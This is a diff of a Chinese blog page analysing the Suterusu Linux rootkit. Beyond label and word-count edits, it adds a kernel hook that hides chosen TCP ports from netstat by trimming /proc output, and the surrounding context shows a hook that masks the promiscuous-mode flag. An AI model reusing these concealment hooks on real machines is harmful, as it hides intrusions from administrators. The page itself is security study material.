@@ -90,7 +90,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
             <li class="nav-item">
               <a class="nav-link" href="/">
                 <i class="iconfont icon-home-fill"></i>
-                Home
+                Homepage
               </a>
             </li>
           
@@ -102,7 +102,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
             <li class="nav-item">
               <a class="nav-link" href="/archives/">
                 <i class="iconfont icon-archive-fill"></i>
-                Archives
+                Archive
               </a>
             </li>
           
@@ -114,7 +114,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
             <li class="nav-item">
               <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
-                Categories
+                Category
               </a>
             </li>
           
@@ -126,7 +126,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
             <li class="nav-item">
               <a class="nav-link" href="/tags/">
                 <i class="iconfont icon-tags-fill"></i>
-                Tags
+                Labels
               </a>
             </li>
           
@@ -205,7 +205,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      830 字
+      1k 字
     </span>
   
 
@@ -215,7 +215,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      14
        分钟
     </span>
   
@@ -287,6 +287,11 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
 <p><a href="https://www.cnblogs.com/gaoyang3513/p/10989700.html" target="_blank" rel="noopener">ref: Proc中使用seq_file，数据如何传递 </a></p>
 <p>另外如果要hook另一种网络连接查看方式ss，其系统调用链和netstat不同，用<code>strace ss -antu</code>查看后发现需要hook的函数是<code>recvmsg</code>，后续会尝试实现在自己的demo中</p>
 <p><img src="/2022/07/31/Suterusu%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90-3/StraceSs.png" srcset="/img/loading.gif" lazyload alt="StraceSs"></p>
+<p>再来看具体的hook函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TMPSZ 150</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">n_tcp4_seq_show</span> <span class="hljs-params">( struct seq_file *seq, <span class="hljs-keyword">void</span> *v )</span><br></span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> port[<span class="hljs-number">12</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hidden_port</span> *<span class="hljs-title">hp</span>;</span><br><br>    hijack_pause(tcp4_seq_show);<br>    ret = tcp4_seq_show(seq, v);<br>    hijack_resume(tcp4_seq_show);<br><br>    list_for_each_entry ( hp, &amp;hidden_tcp4_ports, <span class="hljs-built_in">list</span> )<br>    &#123;<br>        <span class="hljs-built_in">sprintf</span>(port, <span class="hljs-string">":%04X"</span>, hp-&gt;port);<br><br>        <span class="hljs-keyword">if</span> ( strnstr(seq-&gt;buf + seq-&gt;count - TMPSZ, port, TMPSZ) )<br>        &#123;<br>            seq-&gt;count -= TMPSZ;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>思路是，先调用真的<code>show</code>向<code>seq</code>中写入一条记录，然后检查写入的内容中是否有<code>:your_port_number</code>这个字符串，如果有，就把<code>seq-&gt;count</code>这个记录缓冲区已经使用的字节数减去一条记录的长度<code>TMPSZ</code>相当于之前写入的无效了；如果没有，就正常放行。</p>
+<p><a href="https://blog.wohin.me/posts/linux-rootkit-02-04/" target="_blank" rel="noopener">ref: Linux Rootkit实验｜0204 Rootkit基本功能之隐藏端口</a></p>
 <h3 id="隐藏混杂模式标记"><a href="#隐藏混杂模式标记" class="headerlink" title="隐藏混杂模式标记"></a>隐藏混杂模式标记</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 代码中引入如下头文件，直接就可以调用这个导出过的接口</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;net/tcp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;net/udp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dev_get_flags</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct net_device *dev )</span><br>    <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">n_dev_get_flags</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct net_dev *dev)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ret;<br>    <br>    hook_pause(dev_get_flags);<br>    ret = dev_get_flags(dev);<br>    hook_resume(dev_get_flags);<br>    <br>    <span class="hljs-keyword">if</span> (hide_promisc) <br>    	ret &amp;= ~IFF_PROMISC; <span class="hljs-comment">// 混杂标志位置空</span><br>        <br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>通过hook原生api <code>dev_get_flags</code>，将混杂标志位隐藏，混杂模式被rootkit用来进行网络流量嗅探，不过其实这样很容易被发现，只要管理员调整混杂模式或使用tcpdump抓包就会被发现</p>
@@ -386,7 +391,7 @@ suterusu的文件、进程、端口隐藏代码简解，位于main.c
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
           <label data-error="x" data-success="v"
-                 for="local-search-input">keyword</label>
+                 for="local-search-input">Keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
